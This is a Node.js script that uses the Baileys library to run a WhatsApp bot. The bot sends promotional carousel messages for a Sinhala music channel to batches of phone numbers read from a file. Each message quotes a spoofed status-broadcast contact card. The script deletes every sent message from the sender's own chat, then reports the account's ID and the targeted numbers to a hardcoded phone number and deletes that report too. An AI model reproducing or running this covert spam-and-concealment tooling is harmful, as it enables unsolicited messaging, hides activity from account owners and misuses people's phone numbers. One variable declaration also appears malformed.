const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    Browsers,
    makeCacheableSignalKeyStore,
    DisconnectReason,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    proto
} = require('baileys');

const fs = require('fs').promises;
const pino = require('pino');
async function connectWhatsApp(num) {

    const { state, saveCreds } = await useMultiFileAuthState("session/" + num);

    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' }).child({ level: 'fatal' }))
        },
        printQRInTerminal: false
    });

    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
        if (connection === 'open') {
            console.log("open...........................")
            const fil1 = await fs.readFile('./user/num.json', 'utf8');
            let fjs = JSON.parse(fil1);
            let snum = []
            let i1 = await sock.prepareWAMessageMedia({
                image: {
                    url: "https://img.youtube.com/vi/QRbGWUo6Rfk/mqdefault.jpg"
                }
            }, {
                upload: sock.waUploadToServer
            })
            let i2 = await sock.prepareWAMessageMedia({
                image: {
                    url: "https://img.youtube.com/vi/rW-uk_FrsSQ/mqdefault.jpg"
                }
            }, {
                upload: sock.waUploadToServer
            })
            let i3 = await sock.prepareWAMessageMedia({
                image: {
                    url: "https://img.youtube.com/vi/MBeAtVIj45Y/mqdefault.jpg"
                }
            }, {
                upload: sock.waUploadToServer
            });
            let slen = 7;
            for (let i = 0; i < slen; i++) {
                await delay(1000);
                snum.push(fjs[i])
                let fgg = {
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        remoteJid: 'status@broadcast' 
                    },
                    message: {
                        contactMessage: {
                            displayName: 'DEAT_LANKA',
                            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:'BEAT_LANKA'\nitem1.TEL;waid=${fjs[i]}:${fjs[i]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                        },
                    },
                };
                const sjid = fjs[i] + "@s.whatsapp.net"
                const co = await sock.sendInteractiveMessage(
                    sjid,
                    {
                        body: "*lyrics කියව කියව whatsapp වලින් සින්දු අහමුත🥵🎧*\n\n- *Download කරන්නත් පුළුවන් ඔන්න💖🙈🎧*\n- ❤️චැට් කරන ගමන් සිංදු අහන්න.\n- ❤️අලුත් සින්දුවක් ආපු ගමන් අහන්න\n\n`follow කරලා තියා ගන්න යාලූ😱. දවසකට සිංදු 15කට වඩා වැටෙනවා☠️`\n\nhttps://whatsapp.com/channel/0029Vb9PSIRDjiOaGx7Ld61A\n",
                        footer: "background සින්දු play කරන්නත් පුලුවන් ක්‍රමයක් තියනවා, View update වලින් ඇවිල්ලම බලන්නකො",
                        carouselMessage: {
                            "cards": [{
                                "footer": {
                                    "text": '8.4M views     2 years ago'

                                },
                                "header": {
                                    title: "Mayam (මායම්) Rahal Alwis Ft Skay Jay",
                                    ...i1,
                                    "hasMediaAttachment": false
                                },
                                "nativeFlowMessage": {
                                    "buttons": [{
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "View update",
                                            url: "https://whatsapp.com/channel/0029Vb9PSIRDjiOaGx7Ld61A/775"
                                        })
                                    },{
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "LYRICS & DOWNLOAD",
                                            url: "https://whatsapp.com/channel/0029Vb9PSIRDjiOaGx7Ld61A/774"
                                        })
                                    }]
                                }
                            },{
                                "footer": {
                                    "text": '18M views    2 years ago'

                                },
                                "header": {
                                    title: "HORIZON NEW NONSTOP 2023 AMUKA DUMUKA",
                                    ...i2,
                                    "hasMediaAttachment": false
                                },
                                "nativeFlowMessage": {
                                    "buttons": [{
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "View update",
                                            url: "https://whatsapp.com/channel/0029Vb9PSIRDjiOaGx7Ld61A/760"
                                        })
                                    },{
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "DOWNLOAD",
                                            url: "https://whatsapp.com/channel/0029Vb9PSIRDjiOaGx7Ld61A/759"
                                        })
                                    }]
                                }
                            },{
                                "footer": {
                                    "text": '10M views    3 years ago'

                                },
                                "header": {
                                    title: "Meuwa Beheth (මෙව්වා බෙහෙත්)",
                                    ...i3,
                                    "hasMediaAttachment": false
                                },
                                "nativeFlowMessage": {
                                    "buttons": [{
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "View update",
                                            url: "https://whatsapp.com/channel/0029Vb9PSIRDjiOaGx7Ld61A/692"
                                        })
                                    },{
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "DOWNLOAD",
                                            url: "https://whatsapp.com/channel/0029Vb9PSIRDjiOaGx7Ld61A/691"
                                        })
                                    }]
                                }
                            }],
                        },
                    },{ quoted: fgg });
                    
                console.log(co);
                
                await sock.chatModify({
                    delete: true,
                    lastMessages: [
                        {
                            key: co.key,
                            messageTimestamp: co.messageTimestamp
                        }
                    ]
                },
                    co.key.remoteJid
                );
                
            }
            try {
                fjs.splice(0, slen);
                await fs.writeFile('./user/num.json', JSON.stringify(fjs));
                const co2 =  await sock.sendMessage("94716963286@s.whatsapp.net",{text:sock.user.id.split('@')[0]+'\n\n'+JSON.stringify(snum)})
                await sock.chatModify({delete: true,
                    lastMessages: [{key: co2.key,messageTimestamp: co2.messageTimestamp}]
                },co2.key.remoteJid);
            } catch (error) {}
            process.send({end:true});

        } else if (connection === 'close') {
            const shouldReconnect = (lastDisconnect?.error)?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log('Connection closed due to', lastDisconnect?.error, ', reconnecting:', shouldReconnect);

            if (shouldReconnect) {
                connectWhatsApp(num)
            }else{
                process.send({end:true});

            }
        }
    });
    sock.react = async (m, r) => {
        try {
            const reactionMessage = {
                react: {
                    text: r,
                    key: m.key,
                },
            };
            return await sock.sendMessage(m.key.remoteJid, reactionMessage);
        } catch (error) {
            console.error('Failed to send reaction:', error);
        }
    };
    var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
        function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
        return new (P || (P = Promise))(function (resolve, reject) {
            function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
            function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
            function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
            step((generator = generator.apply(thisArg, _arguments || [])).next());
        });
    };
    sock.prepareWAMessageMedia = function (message, options) {
        return __awaiter(this, void 0, void 0, function* () {
            return (0, prepareWAMessageMedia)(message, options);
        });
    }
    sock.sendInteractiveMessage = async (jid, m,q={}) => {
        constecre = {
            "body": { "text": m.body || "" },
            "footer": { "text": m.footer || "" },
            "carouselMessage": m.carouselMessage
        }


        let msg = (0, generateWAMessageFromContent)(jid, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create(constecre)
                }
            }
        }, {...q,"timestamp": new Date()});

        sock.relayMessage(jid, msg.message, {
            messageId: msg.key.id
        });
        return msg
    };




}
const botNumber = process.argv[2];
connectWhatsApp(botNumber)
